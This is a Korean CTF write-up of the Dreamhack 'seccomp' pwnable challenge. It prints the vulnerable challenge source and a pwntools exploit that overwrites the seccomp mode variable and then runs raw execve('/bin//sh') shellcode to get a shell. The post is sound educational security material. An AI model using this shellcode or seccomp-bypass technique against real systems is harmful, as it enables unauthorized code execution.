---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN seccomp"
excerpt: "드림핵 포너블 seccomp 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-03-24 18:00
---

이번 문제는 리눅스 샌드박스 기능인 seccomp 문제다. seccomp는 리눅스 커널에서 특정 system call를 필터링 하는 기능이다. 특정 함수를 사용하지 못하게 막거나 특정 함수만 사용할 수 있도록 제한하는 기능을 제공한다.

간단하게 설명하겠다. seccomp는 두가지 모드가 있다. STRICT_MODE 와 FILTER_MODE가 있는데 STRICT_MODE는 read, write, exit, sigreturn system call만 허용한다. FILTER_MODE는 개발자가 특정 함수에 대한 필터를 구성해 allow list 또는 deny list방식으로 운용이 가능하다.

일단 문제의 소스코드를 살펴보자.

```c++
// gcc -o seccomp seccomp.cq
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/unistd.h>
#include <linux/audit.h>
#include <sys/mman.h>

int mode = SECCOMP_MODE_STRICT;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int syscall_filter() {
    #define syscall_nr (offsetof(struct seccomp_data, nr))
    #define arch_nr (offsetof(struct seccomp_data, arch))
    
    /* architecture x86_64 */
    #define REG_SYSCALL REG_RAX
    #define ARCH_NR AUDIT_ARCH_X86_64
    struct sock_filter filter[] = {
        /* Validate architecture. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
        /* Get system call number. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
        };
    
    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
        };
    if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
        return -1;
        }
    
    if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
        perror("Seccomp filter error\n");
        return -1;
        }
    return 0;
}


int main(int argc, char* argv[])
{
    void (*sc)();
    unsigned char *shellcode;
    int cnt = 0;
    int idx;
    long addr;
    long value;

    initialize();

    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    while(1) {
        printf("1. Read shellcode\n");
        printf("2. Execute shellcode\n");
        printf("3. Write address\n");
        printf("> ");

        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if(cnt != 0) {
                    exit(0);
                }

                syscall_filter();
                printf("shellcode: ");
                read(0, shellcode, 1024);
                cnt++;
                break;
            case 2:
                sc = (void *)shellcode;
                sc();
                break;
            case 3:
                printf("addr: ");
                scanf("%ld", &addr);
                printf("value: ");
                scanf("%ld", addr);
                break;
            default:
                break;
        }
    }
    return 0;
}
```

처음 문제를 보고 FILTER_MODE가 적용된줄 알았다. 그러나 맨 위에 mode 변수를 보면 STRICT_MODE가 설정되어 있다. 함수 필터에 아무런 필터를 구성하지 않고 해당 필터를 STRICT_MODE로 적용한 것이다. 이렇게 되면 read, write, exit, sigreturn system call만 사용할 수 있다.

이 모드를 못보고 계속 AND 연산 하면서 뻘짓을 했었다.

main함수를 살펴보면 case 1번에서 필터 설정을 진행하고 쉘코드를 입력 받는다. case 2를 통해 입력받은 쉘 코드를 실행하고 case 3을 이용하면 원하는 주소의 값을 바꿀 수 있다.

익스플로잇을 구상해보면 case 1번이 실행되기 전에 case 3을 통해서 mode 변수의 내용을 FILTER_MODE로 바꾸면 쉽게 쉘코드를 실행 할 수 있을 것 같다. 

gdb를 통해 해당 주소의 내용을 확인해 보면 다음과 같다.

```
pwndbg> x/x &mode
0x602090 <mode>:        0x00000001
```

STRICT_MODE는 1, FILTER_MODE는 2이다. 따라서 해당 주소의 값을 2로 바꾸고 아무 쉘코드를 실행하면 플래그를 얻을 수 있다.

익스플로잇 코드는 다음과 같다.

```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

#p = remote("host3.dreamhack.games", 16715);
#p = process("./iofile_vtable_check", env={'LD_PRELOAD':'./libc.so.6'})
p = process("./seccomp")
#elf = ELF("./cpp_container_1")
#libc = ELF("./libc.so.6")

mode = 0x602090
shell = b"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
 
p.sendlineafter("> ", "3")
p.sendlineafter("addr: ", str(mode))
p.sendlineafter("value: ", "2")

p.sendlineafter("> ", "1")
p.sendafter("shellcode: ", shell)
 
p.sendlineafter("> ", "2")
 
p.interactive()
```